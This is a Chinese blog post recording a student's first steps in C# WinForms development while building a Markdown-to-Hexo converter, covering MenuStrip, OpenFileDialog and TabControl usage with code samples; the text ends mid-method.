<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>从高中时就对开发软件比较感兴趣，用过pygame写过小游戏，当时其实也想用Unity来写个游戏来着。不过高中确实学业压力比较重，加上Unity主要是用C#作为编程语言的，当时也没接触过C#语言，就不了了之。大一又误入安全歧途:smirk:，一直在打ctf，现在趁寒假学点windows程序开发。一开始我看了b站上的视频学习windows程序设计，用的是windows api，不过都是上古（指5年前）的产物了。后面一问gpt才发现，C#是 Windows 应用程序开发的首选语言，尤其是对于快速开发而言。这里就不再从基础语法学起，直接结合ai智慧搓一个小项目来学习吧。</p>
<p>因为我平时做学习的记录都是直接用markdown记录，那么如果想将文章部署到我的博客</p>
<p>这里我们的项目目标是将一般的Markdown文件转换成Hexo特定主题的文章格式，其实hexo是可以直接解析markdown语法，但是需要手动把图片复制到特定目录下，并且图片的显示却会出现问题。看了hexo的开发文档发现可以用<code>&#123;% asset_img img_name %&#125;</code>来指定显示的图片。那么我们可以就以这个目标来学习windows的程序开发。</p>
<p>先安装个AI辅助插件，增加效率。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125125053180.png"
                      class=""
                >
<h4 id="功能设计"><a href="#功能设计" class="headerlink" title="功能设计"></a>功能设计</h4><ol>
<li><strong>用户界面 (UI) 设计</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>提供直观的图形界面，让用户轻松完成文件选择、设置和 Markdown 文件转换。</li>
</ul>
</li>
<li>具体实现<ul>
<li><strong>文件选择界面</strong>：使用 <code>TreeView</code> 或 <code>ListView</code> 显示文件夹结构，支持拖拽文件。</li>
<li><strong>设置界面</strong>：使用 <code>TextBox</code>、<code>ComboBox</code> 等控件来输入 Hexo 路径、选择主题、设置发布模式，切换语言等。</li>
<li><strong>进度显示和日志</strong>：在转换和处理过程中，显示进度条、日志或消息提示，帮助用户了解当前操作进展。</li>
<li><strong>错误提示</strong>：当出现错误时，显示友好的错误消息，帮助用户解决问题。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>设置界面 (Settings Interface)</strong></li>
</ol>
<ul>
<li><p>功能</p>
<ul>
<li>设置 Hexo 本地路径，让程序知道 Hexo 文件夹的位置。</li>
<li>设置显示字体与大小。</li>
<li>选择 Hexo 主题，或者设置 Hexo 相关配置项。</li>
<li>设置显示语言</li>
</ul>
</li>
<li><p>具体实现</p>
<ul>
<li><p>使用表单控件（例如 <code>TextBox</code>、<code>ComboBox</code> 等）来接收用户输入的路径、模式和主题等信息。</p>
</li>
<li><p>使用 <code>FolderBrowserDialog</code> 来允许用户选择本地 Hexo 路径。</p>
</li>
<li><p>提供保存设置的功能，可以将用户选择的路径和设置保存到配置文件中（如 <code>.json</code> 或 <code>.xml</code> 格式）或者注册表中，保证下次启动时能够恢复。</p>
</li>
<li></li>
</ul>
</li>
</ul>
<ol>
<li><strong>Markdown 转换和图片处理功能 (Markdown Conversion and Image Handling)</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>将用户选定的 Markdown 文件转为 Hexo 特定主题的文章格式。</li>
<li>自动处理图片，复制到 Hexo 主题的特定目录，并使用 Hexo 的图片语法（例如 <code>&#123;% asset_img img_name %&#125;</code>）来引用图片。</li>
</ul>
</li>
<li>具体实现<ul>
<li>解析 Markdown 文件内容，是直接使用文件IO操作，增加和替换特定内容。</li>
<li>提取 Markdown 文件中的图片路径并处理：<ul>
<li>将图片文件复制到 Hexo 主题目录中的 <code>/source/images/</code> 或其他指定目录。</li>
<li>在生成的文章中，使用 Hexo 语法 <code>&#123;% asset_img img_name %&#125;</code> 来引用图片。</li>
</ul>
</li>
<li>图片复制时，检查目标目录是否已经有相同的文件，避免覆盖。</li>
<li>可以使用正则表达式或其他文本处理方法来解析和替换 Markdown 中的图片路径。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>插件系统 (Plugin System)</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>允许未来扩展，比如自动获取 Hexo 特定主题配置、提供更多 Hexo 主题支持、图像优化等。</li>
<li>可以支持插件的安装、卸载和更新。</li>
</ul>
</li>
<li>具体实现<ul>
<li>设计插件接口，允许通过 DLL 动态加载插件。</li>
<li>使用 C# 的反射（Reflection）机制动态加载插件并调用其中的功能。</li>
<li>设计一个简单的插件管理器，允许用户选择和管理插件。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>可拓展性和未来计划</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>未来可以加入更多的 Hexo 特定功能，如一键获取和配置 Hexo 特定主题，自动生成页面摘要、标签等。</li>
<li>也可以扩展支持其他平台的静态网站生成器，或者为用户提供更多的 Markdown 格式转换选项。</li>
</ul>
</li>
<li>具体实现<ul>
<li>通过插件架构，将新功能封装为独立的插件，用户可以根据需求安装和启用。</li>
<li>提供 SDK 或文档，允许第三方开发者为项目开发自定义插件。</li>
</ul>
</li>
</ul>
<h4 id="UI界面设计"><a href="#UI界面设计" class="headerlink" title="UI界面设计"></a>UI界面设计</h4><h5 id="菜单栏实现"><a href="#菜单栏实现" class="headerlink" title="菜单栏实现"></a>菜单栏实现</h5><p>创建好项目后，将会看到一个默认的窗体（Form）。默认情况下，Visual Studio 会打开窗体的设计视图（设计器视图），可以在这里设计界面。</p>
<p>比如我们要<strong>添加按钮组件</strong>，就可以在 <strong>设计视图</strong> 中，你可以通过工具箱拖放控件来创建界面元素。</p>
<ol>
<li>打开 <strong>工具箱</strong>（通常位于 Visual Studio 窗口的左侧，如果没有看到工具箱，可以通过 <strong>视图 &gt; 工具箱</strong> 打开）。</li>
<li>在 <strong>工具箱</strong> 中，找到 <strong>按钮</strong>（Button）控件。</li>
<li>将按钮从工具箱中拖动到窗体上。</li>
<li>放置按钮后，你可以调整按钮的位置、大小以及其他属性。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125132903827.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133204899.png"
                      class=""
                >
<p>之后就会创建button1的组件，我们可以在button1_Click中设计其被点击后的行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133318279.png"
                      class=""
                >
<p>不过常见的菜单栏组件一般为<strong>MenuStrip</strong>控件，而不是靠button的堆叠。这里我们的目标是先实现一个菜单栏，里面有打开、设置、插件和帮助四个选项。过程就是从工具箱中选<strong>MenuStrip</strong>拖到设计图中。我们还可以设置子菜单，但这里我们先从简单的功能实现起，暂时不用子菜单。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125134843093.png"
                      class=""
                >
<p>接下来我们要实现的是点击 <strong>File</strong> 菜单后，显示本机目录选择对话框，并将选中的文件目录保存到某个变量。首先我们来看一下<strong>InitializeComponent</strong>的实现，这里所有菜单组件的实现都类似，所以我们只用看一个<strong>File</strong>组件对应的实现。实际上，这些代码都是自动生成的，不需要我们更改。但为了更好理解过程，这里进行细致的学习。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125140341460.png"
                      class=""
                >
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// menuStrip1</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.menuStrip1.ImageScalingSize = <span class="keyword">new</span> System.Drawing.Size(<span class="number">20</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Items.AddRange(<span class="keyword">new</span> System.Windows.Forms.ToolStripItem[] &#123;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.SettingsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.PluginsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.HelpToolStripMenuItem&#125;);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Location = <span class="keyword">new</span> System.Drawing.Point(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Name = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">948</span>, <span class="number">28</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.TabIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Text = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// FileToolStripMenuItem</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Name = <span class="string">&quot;FileToolStripMenuItem&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">48</span>, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Text = <span class="string">&quot;File&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Click += <span class="keyword">new</span> System.EventHandler(<span class="keyword">this</span>.FileToolStripMenuItem_Click);</span><br></pre></td></tr></table></figure></div>
<p><code>menuStrip1</code>：这是菜单栏的容器控件，负责将菜单项（如 <strong>File</strong>）显示在窗体顶部。</p>
<p><code>FileToolStripMenuItem</code>：这是菜单栏中的一个菜单项，用来表示 <strong>File</strong> 菜单。</p>
<p><code>this.menuStrip1.Items.AddRange(...)</code>：将多个组件添加到 <code>menuStrip1</code> 中，表示在菜单栏中添加 <strong>File</strong> 、<strong>Settings</strong>等菜单项。</p>
<p><code>this.FileToolStripMenuItem.Click += new System.EventHandler(this.FileToolStripMenuItem_Click);</code>：这行代码表示当点击 <strong>File</strong> 菜单项时，会触发 <code>FileToolStripMenuItem_Click</code> 方法。</p>
<p>其余一些设置名称和设置大小的内容就不作赘述。</p>
<h5 id="可视化文件选取实现"><a href="#可视化文件选取实现" class="headerlink" title="可视化文件选取实现"></a>可视化文件选取实现</h5><p><strong>FileToolStripMenuItem_Click</strong>实现如下（在Form1.cs中），是用<strong>OpenFileDialog</strong>实现可视化菜单。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">            <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置对话框的描述</span></span><br><span class="line">                fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">                fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">                <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 显示选中文件的路径</span></span><br><span class="line">                    MessageBox.Show(<span class="string">$&quot;您选择的文件路径是: <span class="subst">&#123;selectedFilePath&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 你可以在这里处理选中的文件</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125141650926.png"
                      class=""
                >
<p>获取到了选择的文件后，就可以进行进一步的处理了。为了将业务逻辑和具体的功能处理应该尽量与界面逻辑分离，所以我们要新建一个<strong>FileProcessor</strong>类，里面创建<strong>ProcessMarkdownFile</strong>方法来用于实现业务逻辑。而在Form1.cs中可以简单的创建对象并调用其方法。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理选中的文件</span></span><br><span class="line">    FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">    processor.ProcessMarkdownFile(selectedFilePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileProcessor.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">			......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="窗口大小获取"><a href="#窗口大小获取" class="headerlink" title="窗口大小获取"></a>窗口大小获取</h5><p>获取各组件大小是设计UI的关键内容。</p>
<p>获取整个窗口的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取窗口的大小（不包括标题栏和边框）</span></span><br><span class="line">Size windowSize = <span class="keyword">this</span>.ClientSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取窗口的总大小（包括标题栏和边框）</span></span><br><span class="line">Size totalWindowSize = <span class="keyword">this</span>.Size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;Window Size: <span class="subst">&#123;windowSize.Width&#125;</span> x <span class="subst">&#123;windowSize.Height&#125;</span>\n&quot;</span> +</span><br><span class="line">                <span class="string">$&quot;Total Window Size: <span class="subst">&#123;totalWindowSize.Width&#125;</span> x <span class="subst">&#123;totalWindowSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>获取 <code>MenuStrip</code> 的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 MenuStrip 的大小</span></span><br><span class="line">Size menuStripSize = menuStrip1.Size;</span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;MenuStrip Size: <span class="subst">&#123;menuStripSize.Width&#125;</span> x <span class="subst">&#123;menuStripSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h5 id="单窗口页面切换实现"><a href="#单窗口页面切换实现" class="headerlink" title="单窗口页面切换实现"></a>单窗口页面切换实现</h5><p>之后我们先不急于实现业务逻辑，继续设计settings的UI。这里我不想弹出一个新的窗体进行窗口配置，目标就是在原先窗口中能有窗口选项卡进行切换。这里可以选择用<strong>TabControl</strong>组件进行实现。当用户点击 <code>MenuStrip</code> 中的 <code>Settings</code> 或 <code>Help</code> 等菜单项时，在 <strong>TabControl</strong> 中动态创建一个对应的 <strong>TabPage</strong> 组件。每个<strong>TabPage</strong>都能够往里面add各种控件，相当于一个我们要设计的页面，而主窗口显示哪个<strong>TabPage</strong>就是由<strong>TabControl</strong>进行控制。</p>
<p>先了解下<strong>TabControl</strong>的常用属性与方法：</p>
<p><strong>常用属性</strong></p>
<ol>
<li><p><strong><code>SelectedTab</code></strong></p>
<p>获取或设置当前选中的 <code>TabPage</code>。</p>
<p><strong>类型</strong>: <code>TabPage</code></p>
</li>
<li><p><strong><code>TabPages</code></strong></p>
<p>获取包含所有选项卡的 <code>TabPageCollection</code>，可以通过该属性访问、添加、删除选项卡。</p>
<p><strong>类型</strong>: <code>TabPageCollection</code></p>
</li>
<li><p><strong><code>TabCount</code></strong></p>
<p>获取 <code>TabControl</code> 中的选项卡数目。</p>
<p><strong>类型</strong>: <code>int</code></p>
</li>
<li><p><strong><code>Alignment</code></strong></p>
<p>获取或设置选项卡的对齐方式（例如，顶部、底部、左侧或右侧）。</p>
<p><strong>类型</strong>: <code>TabAlignment</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Alignment = TabAlignment.Top; <span class="comment">// 顶部对齐</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>ItemSize</code></strong></p>
<p>获取或设置选项卡的大小（宽度和高度）。</p>
<p><strong>类型</strong>: <code>Size</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.ItemSize = <span class="keyword">new</span> Size(<span class="number">100</span>, <span class="number">30</span>); <span class="comment">// 设置选项卡宽度和高度</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Multiline</code></strong></p>
<p>获取或设置是否允许选项卡多行显示。</p>
<p><strong>类型</strong>: <code>bool</code></p>
</li>
<li><p><strong><code>TabIndex</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的索引（即它在窗体中所占的位置）。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> tabIndex = tabControl.TabIndex;</span><br><span class="line">tabControl.TabIndex = <span class="number">1</span>; <span class="comment">// 设置选项卡的索引</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>TabStop</code></strong></p>
<p>获取或设置是否允许在 <code>TabControl</code> 中使用 Tab 键进行切换。</p>
<p><strong>类型</strong>: <code>bool</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabStop = <span class="literal">false</span>; <span class="comment">// 禁用 Tab 键切换</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Dock</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的停靠方式。</p>
<p><strong>类型</strong>: <code>DockStyle</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Dock = DockStyle.Fill; <span class="comment">// 填充整个容器</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Height</code> 和 <code>Width</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的高度和宽度。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Height = <span class="number">300</span>; <span class="comment">// 设置高度</span></span><br><span class="line">tabControl.Width = <span class="number">500</span>;  <span class="comment">// 设置宽度</span></span><br></pre></td></tr></table></figure></div>
</li>
</ol>
<p><strong>常用方法</strong></p>
<ol>
<li><p><strong><code>Add(TabPage page)</code></strong></p>
<p>向 <code>TabControl</code> 中添加一个新的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage newPage = <span class="keyword">new</span> TabPage(<span class="string">&quot;New Tab&quot;</span>);</span><br><span class="line">tabControl.TabPages.Add(newPage);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Remove(TabPage page)</code></strong></p>
<p>从 <code>TabControl</code> 中移除一个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Remove(someTabPage);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Clear()</code></strong></p>
<p>清除所有的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Clear(); <span class="comment">// 清空所有选项卡</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>SelectTab(int index)</code></strong></p>
<p>通过索引选择某个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="number">1</span>); <span class="comment">// 选择第2个选项卡（索引从0开始）</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>SelectTab(string tabName)</code></strong></p>
<p>通过选项卡的名称选择某个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="string">&quot;TabName&quot;</span>); <span class="comment">// 选择名称为 &quot;TabName&quot; 的选项卡</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>ContainsKey(string key)</code></strong></p>
<p>判断某个 <code>TabPage</code> 是否存在，基于其 <code>Name</code> 属性。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bool</span> exists = tabControl.TabPages.ContainsKey(<span class="string">&quot;TabName&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Find(string key, bool searchAllTabs)</code></strong></p>
<p>查找具有指定名称的 <code>TabPage</code>，可以指定是否在所有选项卡中查找。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage foundTab = tabControl.TabPages.Find(<span class="string">&quot;TabName&quot;</span>, <span class="literal">true</span>)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>EnableDoubleBuffering()</code></strong></p>
<p>设置 <code>TabControl</code> 是否使用双缓冲机制（帮助避免闪烁）。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.DoubleBuffered = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></div>
</li>
</ol>
<p><strong>常用事件</strong></p>
<ol>
<li><p><strong><code>SelectedIndexChanged</code></strong></p>
<p>当选中的选项卡发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectedIndexChanged += (s, e) =&gt; </span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已切换&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Selecting</code></strong></p>
<p>当选项卡即将被选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Selecting += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡正在被选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Deselected</code></strong></p>
<p>当选项卡被取消选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Deselected += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已取消选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>TabIndexChanged</code></strong></p>
<p>当选项卡的索引发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabIndexChanged += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡索引发生变化&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
</ol>
<p>具体实现</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="keyword">private</span> TabControl tabControl;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            InitializeCustomComponents();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SettingsToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Settings&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">HelpToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Help&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态创建一个 TabPage，并添加到 TabControl</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">        